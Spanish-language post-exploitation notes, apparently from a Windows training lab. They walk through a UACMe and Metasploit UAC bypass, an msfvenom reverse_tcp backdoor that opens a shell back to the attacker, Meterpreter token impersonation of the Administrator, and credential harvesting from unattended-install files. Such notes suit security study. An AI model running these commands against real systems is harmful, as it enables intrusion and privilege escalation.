<h1 align="center">POST EXPLOTACIÓN WINDOWS</h1>

## **Bypass UAC con UACMe**

El Control de Cuentas de Usuario (UAC) es la notificación que aparece en Windows cuando se intenta ejecutar un programa con permisos de administrador. UACMe es una herramienta que permite bypassear el UAC sin necesidad de ingresar la contraseña de un administrador local para elevar los privilegios de un programa.

### **Requisitos**

Es necesario tener control de un usuario dentro del grupo de administradores locales y que la configuración de UAC no se haya modificado desde la instalación de Windows.

### **Proceso**

Lo primero que debemos hacer es conseguir una sesión de meterpreter en la máquina víctima y migrarla a explorer.exe para conseguir una sesión de 64 bits.

![image](https://github.com/user-attachments/assets/516c78f1-b086-4d83-b71b-713da08df9f1)

Ahora, tenemos una sesión de meterpreter con el usuario admin. Este usuario está en el grupo de administradores locales, lo que le permite ejecutar programas con permisos de administrador, aunque dispone de bajos privilegios (por ejemplo, no puede ejecutar un payload con permisos de administrador)

![image](https://github.com/user-attachments/assets/89df7b86-ed70-4f44-b997-9dc96ee96168)

Para elevar los privilegios, nos descargamos el repositorio de UACMe desde github.

Vamos a bypasear el UAC para ejecutar este payload de msfvenom para crear una sesión de meterpreter con para aumentar nuestros privilegios:

- msfvenom -p windows/meterpreter/reverse_tcp LHOST=\*ip\*LPORT=1234 -f exe > backdoor.exe

Después, en Metasploit, utilizamos multi/handler y establecemos el mismo payload que en msfvenom:

- set PAYLOAD windows/meterpreter/reverse_tcp

Volvemos a la sesión de meterpreter, vamos a la carpeta C:\\temp y subimos nuestro payload y el ejecutable Akagy64:

- upload backdoor.exe
- upload akagy64
- shell

Para ejecutar backdoor.exe con permisos de administrador, utilizamos akagy64 con el siguiente comando CON RUTA COMPLETA:

/root/Desktop/tools/UACME

- .\\akagy64 23 C:\\temp\\backdoor.exe

La _key_ depende de la versión de Windows. El número a utilizar se encuentra en el repositorio de GitHub. Para instalar paquetes en Windows 7, utilizamos el número 23, que instala el packet manager, permitiendo la instalación de paquetes.

Si vamos al multi/handler y establecemos el mismo payload que en msfvenom, hemos conseguido una sesión de meterpreter de altos privilegios:

![image](https://github.com/user-attachments/assets/4195d38d-42bf-4660-8dfe-b7ff7fecb788)

Para conseguir el permiso de AUTHORITY/System, debemos migrar a otro proceso que esté ejecutando este usuario. Así, habremos pasado del usuario admin con altos privilegios al administrador local.

## **Bypass UAC con METASPLOIT**

- use exploit/windows/local/bypassuac_injection
- set session 1
- set TARGET 1
- set PAYLOAD windows/x64/meterpreter/reverse_tcp

## **ACCESS TOKEN IMPERSONATION**

### **Elevación de Privilegios Mediante Suplantación de Tokens en Windows**

Los tokens de acceso de Windows son el principal elemento del proceso de autenticación y son creados y distribuidos por el servicio "Local Security Authority Subsystem Service (LSASS)". Estos tokens son generados por winlogon.exe cada vez que un usuario se autentica correctamente. El token contiene información del usuario autenticado y los privilegios asociados a un proceso, y se utiliza para restringir el acceso de los usuarios, determinando qué pueden y no pueden ejecutar.

###

### **Tipos de Tokens de Acceso**

1. **Impersonate-level tokens (tokens suplantados):**
    - Permiten actuar totalmente como el usuario cuyo token estamos suplantando.
2. **Delegate-level tokens (tokens normales):**
    - Permiten actuar parcialmente como el usuario, con permisos limitados.

Para realizar el proceso de suplantación de un "Impersonate-level token" con la intención de elevar privilegios, el usuario al que tenemos acceso debe tener los siguientes privilegios:

![image](https://github.com/user-attachments/assets/2b359a2b-12fe-47d7-ba9d-489668ddaba2)

### **Uso de Incognito para Suplantar Tokens**

Incognito es una herramienta de meterpreter que permite suplantar tokens después de la explotación de una máquina. Aquí están los pasos detallados para su utilización:

1. **Acceso a la Máquina:**

- Una vez que hemos explotado una máquina y tenemos acceso a un usuario con bajos privilegios que tiene el privilegio de SeImpersonatePrivilege.

1. **Cargar Incognito en Meterpreter:**

Si no podemos migrar la sesión a otro proceso debido a la falta de permisos, cargamos Incognito:

- load incognito

1. **Listar Tokens Disponibles:**

- list_tokens -u

(Somos NT AUTHORITY\\LOCAL SERVICE y queremos suplantar el token del administrador)

![image](https://github.com/user-attachments/assets/d94e2866-ed62-47b1-8900-65d147235674)


1. **Suplantar el Token del Administrador:**

Suplantamos el token de acceso de “ATTACKDEFENSE\\Administrator”:

- impersonate_token "ATTACKDEFENSE\\Administrator"

![image](https://github.com/user-attachments/assets/bc9c98e1-74bc-4340-9821-a6ca7863cea4)

Con getuid podemos ver que ha cambiado nuestro usuario. Para poder comprobar nuestros privilegios sin que nos de ningún error tenemos que migrar la sesión a un servicio que lo esté ejecutando el usuario administrator, por ejemplo explorer.exe. Ahora comprobamos los privilegios del usuario:

![image](https://github.com/user-attachments/assets/fcc0b989-4a24-4fb1-8c33-25cb006c9d5b)

## **INSTALACIÓN DESATENDIDA**

Cuando se realiza una instalación desatendida (Proceso automático de instalación de Windows), se suele almacenar las credenciales del usuario administrador en las siguientes rutas:  

- C:\\Windows\\Pather\\unattend.xml
- C:\\Windows\\Pather\\autounattend.xml

Una vez localizamos este archivo podemos buscar la forma de logearnos con estas credenciales: psexec, winrm…
